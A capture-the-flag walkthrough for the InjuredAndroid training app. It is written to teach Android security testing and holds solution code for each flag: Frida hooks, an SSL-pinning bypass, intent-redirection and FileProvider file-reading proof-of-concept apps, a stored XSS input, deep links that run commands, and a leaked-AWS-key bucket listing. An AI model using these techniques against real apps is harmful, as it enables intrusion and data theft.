## InjuredAndroid walk-throughs

### Flag 1 - F1ag_0n3

1. Review source code and find the comparison string.

```java
if (post.equals("F1ag_0n3")) {
            Intent intent = new Intent(this, FlagOneSuccess.class);
            FlagsOverview.flagOneButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagOneButtonColor", true).commit();
            startActivity(intent);
        }
```

2. Submit the comparison string to score.

---

### Flag 2 - S3cond_F1ag

1. Invoke exported activity with adb or PoC app. (PoC app will help with later exercises)

```bash
adb shell am start -n b3nac.injuredandroid/.b25lActivity

```

```java
package b3nac.injuredandroid.poc;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent start = new Intent();
        start.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.b25lActivity");
        startActivity(next);
    }

}

```

This flag is intended to introduce how starting exported activities work.

---

### Flag 3 - F1ag_thr33

1. Source code review based exercise. Trace resource reference to strings.xml.

```java

if (post.equals(getString(R.string.cmVzb3VyY2VzX3lv))) {
            Intent intent = new Intent(this, FlagOneSuccess.class);
            FlagsOverview.flagThreeButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagThreeButtonColor", true).commit();
            startActivity(intent);
        }

```

2. In strings.xml search for R.string.cmVzb3VyY2VzX3lv. 

`<string name="cmVzb3VyY2VzX3lv">F1ag_thr33</string>`

3. Submit the value as the flag.

---

### Flag 4 - 4_overdone_omelets

1. Find where the bob variable is located.

```java

String bob = new String(decoder.getData());

if (post.equals(bob)) {
            Intent intent = new Intent(this, FlagOneSuccess.class);
            FlagsOverview.flagFourButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagFourButtonColor", true).commit();
            startActivity(intent);
        }

```

2. Search the Decoder class for the base64 string and decode it or hook the method with frida.

```java

public class Decoder {
    byte [] data = Base64.decode("NF9vdmVyZG9uZV9vbWVsZXRz", Base64.DEFAULT);

    public byte[] getData() {
        return data;
    }
}

```

3. Submit the Base64 decoded value.

---

### Flag 5 - {F1V3!}

1. Iterate the broadcast by revisiting activity. 

2. After visiting the FlagFiveActivity three times the flag will be broadcasted.


```java

if (wtf == 0) {
            StringBuilder sb = new StringBuilder();
            sb.append("Action: " + intent.getAction() + "\n");
            sb.append("URI: " + intent.toUri(Intent.URI_INTENT_SCHEME) + "\n");
            String log = sb.toString();
            Log.d("DUDE!:", log);
            Toast.makeText(context, log, Toast.LENGTH_LONG).show();
            wtf = wtf + 1;
        }
        else if (wtf == 1) {
            String win = "Keep trying!";
            Toast.makeText(context, win, Toast.LENGTH_LONG).show();
            wtf = wtf + 1;
        }
        else if (wtf == 2) {

            String win = "You are a winner " + VGV4dEVuY3J5cHRpb25Ud28.decrypt("Zkdlt0WwtLQ=");
            FlagsOverview.flagFiveButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagFiveButtonColor", true).commit();
            Toast.makeText(context, win, Toast.LENGTH_LONG).show();
            
        }else{
            String win = "Keep trying!";
            Toast.makeText(context, win, Toast.LENGTH_LONG).show();
        }

```

---

### Flag 6 - {This_Isn't_Where_I_Parked_My_Car}

1. Use frida to hook the decryption method for the flag.

Python file "test.py" for Frida:

```python

import time
import frida

device = frida.get_usb_device()
pid = device.spawn(["b3nac.injuredandroid"])
device.resume(pid)
time.sleep(1)  # Without it Java.perform silently fails
session = device.attach(pid)
with open("test.js") as f:
    script = session.create_script(f.read())
script.load()

# prevent the python script from terminating
input()

```

Javascript file that is imported with python for Frida:

```javascript

console.log("Script loaded successfully ");
Java.perform(function x() {
    console.log("Inside java perform function");
    var my_class = Java.use("b3nac.injuredandroid.VGV4dEVuY3J5cHRpb25Ud28");
    
    var string_class = Java.use("java.lang.String");

    my_class.decrypt.overload("java.lang.String").implementation = function (x) { //hooking the new function
        console.log("*************************************")
        var my_string = string_class.$new("k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==");
        console.log("Original arg: " + x);
        var ret = this.decrypt(my_string);
        console.log("Return value: " + ret);
        console.log("*************************************")
        return ret;
    };
    Java.choose("b3nac.injuredandroid", {
        onMatch: function (instance) {
            console.log("Found instance: " + instance);
            console.log("Result of secret func: " + instance.decrypt());
        },
        onComplete: function () { }

    });

});


```
---

### Flag 7 - S3V3N_11

1. Find the flag password in the sqlite database.  

2. Flag password first found as a MD5 hash `2ab96390c7dbe3439de74d0c9b0b1767` crack this value to get `hunter2`.

3. The flag url is in the Hide class rot47 encoded: https://injuredandroid.firebaseio.com/sqlite.json 

```java

private static String remoteUrl = "9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@>^DB=:E6];D@?";

```

4. Enter both into the submit flag form for completion.

---

### Flag 8 - C10ud_S3cur1ty_lol

1. Find the AWS bucket information in strings.xml and use disclosed aws id and aws secret to access s3 bucket with awscli.

2. Create AWS profile in `~/.aws/credentials`:

```bash

[injuredandroid]
aws_access_key_id = lookinstrings.xmlnotputtingitheresoawsdoesn'talert
aws_secret_access_key = lookinstrings.xmlnotputtingitheresoawsdoesn'talert


```

3. Use this awscli command to capture the flag.

```bash

aws s3 ls s3://injuredandroid --profile injuredandroid

```

---

### Flag 9 - [nine!_flag]

1. Find the flag by navigating to the firebase endpoint: `https://injuredandroid.firebaseio.com/flags.json`

```java

public class FlagNineFirebaseActivity extends AppCompatActivity {
    int click = 0;
    private static final String TAG = "FirebaseActivity";
    final String directory = "ZmxhZ3Mv";
    byte[] decodedDirectory = Base64.decode(directory, Base64.DEFAULT);
    final String refDirectory = new String(decodedDirectory, StandardCharsets.UTF_8);

```

2. Base64 decode the directory value: `final String directory = "ZmxhZ3Mv";`

3. Which gives you `flags/` which correlates to the endpoint being `flags.json` 

4. Base64 encode the flag from the response of `https://injuredandroid.firebaseio.com/flags.json` to score: `W25pbmUhX2ZsYWdd`

---

### Flag 10 - John@Gıthub.com

1. Research "Github dotless i". 

The method toUpperCase works in Kotlin as well as Java for the unicode collision. 

```kotlin
val value = dataSnapshot.value as String?
                        when {
                            post == value -> Toast.makeText(this@FlagTenUnicodeActivity, "No cheating. :]",
                                    Toast.LENGTH_SHORT).show()
                            post.toUpperCase(Locale.ROOT) == value!!.toUpperCase(Locale.ROOT) -> correctFlag()
                            else -> Toast.makeText(this@FlagTenUnicodeActivity, "Try again! :D",
                                    Toast.LENGTH_SHORT).show()
                        }

```

From the exercise code above we can see that `post.toUpperCase(Locale.ROOT) == value!!.toUpperCase(Locale.ROOT) -> correctFlag()` is converting the dotless ı to a normal i.

2. Authenticate using the `b3nac.injuredandroid.QXV0aA` activity by using an adb command to start the activity.

```bash
adb shell am start -n b3nac.injuredandroid/.QXV0aA

```

3. Submit email with dotless i after authenticating.

---

### Flag 11 - HIIMASTRING

1. First invoke the activity with a deep link so you can access the post form. 

`adb shell am start -W -a android.intent.action.VIEW -d "flag11://"`

2. Secondly find the binary in the apk and run strings on the golang binary or run the binary and the Golang binary will print the flag. 

3. Binary location is: `res/values/meŉu`

---

### Flag 12 - Flag complete after using a PoC apk

1. Complete the exploit by using a PoC app, an example from my Youtube video.

```java

package b3nac.injuredandroid.poc;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent next = new Intent();
        next.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagTwelveProtectedActivity");
        next.putExtra("totally_secure", "https://google.com");

        Intent start = new Intent();
        start.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.ExportedProtectedIntent");
        start.putExtra("access_protected_component", next);

        startActivity(start);
    }

}

```

---

### Flag 13 - Treasure_Planet

#### Non-rooted device

1. Run adb as root (Google apis are needed with VM)

`adb root`

2. Use adb shell to access phone file directories

`adb shell`

3. Navigate to `/data/data/b3nac.injuredandroid/files`.

4. chmod the binary that matches your phone architecture.

`chmod +x binaryname`

5. Now use deep links to display binary command results in the Activity WebView. The flag is split into three separate commands.

```html
<html>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testOne">Test one!</p>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testTwo">Test two!</p>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testThree">Test three!</p>
<p><a href="flag13://rce?combined=Treasure_Planet">OH SNAP!</p>
</html>
```

#### Rooted device

I believe you shouldn't have to chmod the binary with a rooted device.

1. Skip to using deep links to solve the flag.

---

### Flag 14 - Flutter Stored XSS

Solving this flag only requires finding the right javascript function for XSS.

```dart
if (widget.test == "onclick=alert(1)") {
```

1. At the login screen enter `onclick=alert(1)` and login.

2. Navigate to the user profile page and the XSS will fire because It's stored as the username while also solving the flag.

---

### Flag 15 - WIN

1. The initial Activity will have a byte array `[58,40,42]` that requires the key to XOR back to the original flag string.

2. Decompile the flutter.so files to find the XOR key and use a programming language of your choice to convert the byte array to a string then XOR the string with the key to find the flag.

```python
#!/usr/bin/env python
# encoding: utf-8

def encryptDecrypt(input):
    key = ['M', 'A', 'D']
    output = []
    
    for i in range(len(input)):
        xor_num = ord(input[i]) ^ ord(key[i % len(key)])
        output.append(chr(xor_num))
    
    return ''.join(output)


def main():
    encrypted = encryptDecrypt(":(*");
    print("Encrypted:" + encrypted);
    
    decrypted = encryptDecrypt(encrypted);
    print("Decrypted:" + decrypted);
    data = [58,40,42]
    dataConverted = "".join( chr(x) for x in data)
    print(dataConverted)
    pass

if __name__ == '__main__':
    main()
```

---

### Flag 16 - [Nice_Work]

This flag is about bypassing deep link schemes, once you bypass the deep link scheme check the flag will be in the WebView response. We will review `AndroidManifest.xml` and the source code for the activity.

Reviewing `AndroidManifest.xml` we see that the accepted schemes are http and https and a accepted host of `b3nac.com`. The tricky part here is that there also needs to be a path value after the host name. The path value can be anything since it's declared as `android:pathPattern="/.*/"`.

```xml
<activity
            android:name=".CSPBypassActivity"
            android:label="@string/title_activity_c_s_p_bypass"
            android:theme="@style/AppTheme.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />

                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />

                <data
                    android:host="b3nac.com"
                    android:pathPattern="/.*/"
                    android:scheme="http" />
                <data
                    android:host="b3nac.com"
                    android:pathPattern="/.*/"
                    android:scheme="https" />
            </intent-filter>
        </activity>

```

Looking at the source code of `CSPBypassActivity` we can review the validation.

```kotlin
        val intentToUri = intent
        val data = intentToUri.data
        val validScheme = "http" == data?.scheme || "https" == data?.scheme

        if (validScheme) {

            if (data?.scheme == "http") {
                httpToHttps()
            }
            if (data?.scheme == "https") {
                goToUrl(intent.data?.toString())
            }
        }
```

1. Lets review `val validScheme = "http" == data?.scheme || "https" == data?.scheme`

This means the deep link scheme can be http or https.

2. Now we can review the http if statement.

```
if (data?.scheme == "http") {
                httpToHttps()
            }
```

3. We should now checkout the httpToHttps() method.

```kotlin
private fun httpToHttps() {

        val convertToHTTPS = "https://"
        val newSuperSecureURL = convertToHTTPS + intent.data?.host + intent.data?.path
        val intent = Intent(Intent.ACTION_VIEW)
        intent.data = Uri.parse(newSuperSecureURL)
        sendRequest()
        startActivity(intent)
    }

```

So we now know that http deep links get converted to https and this method starts the `sendRequest()` method.

4. Reviewing `sendRequest()`

```kotlin
private fun sendRequest() {
        val editText = findViewById<EditText>(R.id.editText10)
        val button = findViewById<Button>(R.id.button42)
        editText.visibility = View.VISIBLE
        button.visibility = View.VISIBLE
        val queue = Volley.newRequestQueue(this)

        val url = VGV4dEVuY3J5cHRpb25Ud28.decryptAnotherKey("kOC6ZrdMXEnfIKWihcBNLTWIhDiINUfSQyYrFsTpEBGZy1KmfPMTwtba8CXa/WVAVoJ1ACvJMd8f/MF97/7UaeNCQvC9OD4lZ/vQN6LmpBU=")
        val urlTwo = VGV4dEVuY3J5cHRpb25Ud28.decrypt(url)

        val stringRequest = StringRequest(Request.Method.GET, urlTwo,
                { response ->
                    // Display the first 500 characters of the response string.
                    textView7.text = "Response is: ${response.substring(0, 500)}"
                },
                { textView7.text = "Try another url! :D" })

        queue.add(stringRequest)
    }
```

The two interesting variables in this method are url and urlTwo.

```kotlin
val url = VGV4dEVuY3J5cHRpb25Ud28.decryptAnotherKey("kOC6ZrdMXEnfIKWihcBNLTWIhDiINUfSQyYrFsTpEBGZy1KmfPMTwtba8CXa/WVAVoJ1ACvJMd8f/MF97/7UaeNCQvC9OD4lZ/vQN6LmpBU=")
val urlTwo = VGV4dEVuY3J5cHRpb25Ud28.decrypt(url)

```

The variable `url` has the endpoint where the flag is located and the variable `urlTwo` decrypts the enpoint. So there are two ways to solve this flag, either bypassing the deep link scheme logic or hooking the decryption function and viewing the source of that endpoint. :)

The following http deep link will solve the challenge.

```html
<html>
<a href="https://b3nac.com/anything/">Should get blocked</a>
<a href="http://b3nac.com/anything/">CSP Bypass</a>
</html>
```

Submit the value `[Nice_Work]` and you will be congratulated for solving the flag! :D

---

### Flag 17 - Epic_Awesomeness

This flag uses a Flutter module embedded in a native application. After bypassing ssl pinning from the Flutter plugin the flag can be intercepted via Burp. To learn how to setup MITM from your device to Burp checkout my video here [How to intercept traffic from Android apps with Objection and Burp](https://www.youtube.com/watch?v=Ft3H-3J67UE).

1. All the Flutter based exercises are located by navigating to `Flag Fourteen - Flutter XSS`

2. Once you navigate to `Flutter SSL Bypass` then proceed with the walk-through of this exercise.

3. Use the following javascript with frida to bypass the Flutter ssl plugin.

```javascript
function disablePinning()
{
    var SslPinningPlugin = Java.use("com.macif.plugin.sslpinningplugin.SslPinningPlugin");
    SslPinningPlugin.checkConnexion.implementation = function()
    {
        console.log("Disabled SslPinningPlugin");
        return true;
    }
}

Java.perform(disablePinning)
```

The frida command to use in order to hook the method that is used by the Flutter module.

`frida -U -f b3nac.injuredandroid -l flutter-plugin-ssl.js --no-pause`


After Flutter ssl pinning plugin is bypassed the response endpoint will show the flag. :)

```dart
 _makeGetRequest() async {
    // make GET request
    String url = 'http://b3nac.com/Epic_Awesomeness';
    Response response = await get(url);

    int statusCode = response.statusCode;
    Map<String, String> headers = response.headers;
    String contentType = headers['content-type'];
    String json = response.body;

    // Await the http get response, then decode the json-formatted response.

    if (response.statusCode == 200 || response.statusCode == 302 || response.statusCode == 404 || response.statusCode == 500)  {
      var responseBody = response.body;
      print('Number of items: $responseBody.');
    } else {
      print('Request failed with status: ${response.statusCode}.');
    }
  }

```

---

### Flag 18 - 034d361a5942e67697d17534f37ed5a9

#### Recon

First lets take a look at the File Provider in `AndroidManifest.xml`.

```xml

 <activity
            android:name=".FlagEighteenActivity"
            android:exported="true"
            android:label="@string/title_activity_flag_eighteen"
            android:theme="@style/AppTheme.NoActionBar" />

        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="b3nac.injuredandroid.fileprovider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

```

What we are going to need is the `android:authorities` specified for our proof of concept. It's important to note that `android:grantUriPermissions="true"` is set to true. This means that an exported activity can interact with this File Provider via intents that specify the correct uri according to `file_paths.xml`.

```xml
<?xml version ="1.0" encoding ="utf-8"?>
<paths xmlns:android="http://schemas.android.com/apk/res/android">
    <files-path name="files" path="/" />
</paths>
```

The specification of `files-path` equals `/data/data/b3nac.injuredandroid/files`.

#### Using another activity to move files to the correct directory

The Deep link ACE activity or flag 13 will move the test file needed to complete this challenge. Using any of these deep links should work.


```html
<html>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testOne">Test one!</p>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testTwo">Test two!</p>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testThree">Test three!</p>
<p><a href="flag13://rce?combined=Treasure_Planet">OH SNAP!</p>
</html> 
```

The logic moving the files.

```kotlin

if (intent != null && intent.data != null) {
            copyAssets()
            val data = intent.data

```

So if the intent is not null and the intent.data is not equal to null the files in the assets directory will be copied to `/data/data/b3nac.injuredandroid/files`.

#### Create the proof of concept.

Create the intent.

`Intent intent = new Intent();`

Create the File Provider uri.

`intent.setData(Uri.parse("content://b3nac.injuredandroid.fileprovider/files/test"));`

Grant uri permissions.

`intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);`

Set the exported activity class name to call the File Provider.

`intent.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagEighteenActivity");`

Get the result of the uri call.

`startActivityForResult(intent, 0);`

We also need to setup the `onActivityResult` method to print the data from the internal file.

```java

 protected void onActivityResult( int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        try {
            Log.d("OHNO", IOUtils.toString(Objects.requireNonNull(getContentResolver().openInputStream(Objects.requireNonNull(data.getData())))));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

```

If we put all that together the proof of concept looks like this!

```java

package b3nacinjured.pocformyohnocontentprovider;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;

import android.util.Log;
import android.view.View;

import org.apache.commons.io.IOUtils;

import java.io.IOException;
import java.util.Objects;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "OHNO PoC", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });

        Intent intent = new Intent();
        intent.setData(Uri.parse("content://b3nac.injuredandroid.fileprovider/files/test"));
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagEighteenActivity");
        startActivityForResult(intent, 0);

    }

    protected void onActivityResult( int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        try {
            Log.d("OHNO", IOUtils.toString(Objects.requireNonNull(getContentResolver().openInputStream(Objects.requireNonNull(data.getData())))));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}


```

Or if you prefer Kotlin.

```kotlin

package b3nacinjured.pocformyohnocontentprovider

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.Toolbar
import com.google.android.material.floatingactionbutton.FloatingActionButton
import com.google.android.material.snackbar.Snackbar
import org.apache.commons.io.IOUtils
import java.io.IOException
import java.util.Objects.requireNonNull

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val toolbar = findViewById<Toolbar>(R.id.toolbar)
        setSupportActionBar(toolbar)
        val fab = findViewById<FloatingActionButton>(R.id.fab)
        fab.setOnClickListener { view ->
            Snackbar.make(view, "OHNO PoC", Snackbar.LENGTH_LONG)
                    .setAction("Action", null).show()
        }
        val intent = Intent()
        intent.data = Uri.parse("content://b3nac.injuredandroid.fileprovider/files/test")
        intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
        intent.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagEighteenActivity")
        startActivityForResult(intent, 0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        try {
            Log.d("OHNO", IOUtils.toString(requireNonNull(requireNonNull(data!!.data)?.let { contentResolver.openInputStream(it) })))
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}

```

Now when the proof of concept is used it won't display the `Log.d` result unless the back button is pressed. After pressing the back button `text.txt` will be displayed by logcat with the label `OHNO`.

When submitting only text.txt notice that this isn't quite yet the flag value that's needed. I left a hint in the submit function as a comment. :)

`// MD5`

Hashing `text.txt` with the MD5 algorithm will provide the hash `034d361a5942e67697d17534f37ed5a9`. Submit this value to complete the challenge! 


---

There's a video walk-through of all the exercises except Flag 18 here [Android Mobile Hacking Workshop](https://www.youtube.com/watch?v=PMKnPaGWxtg).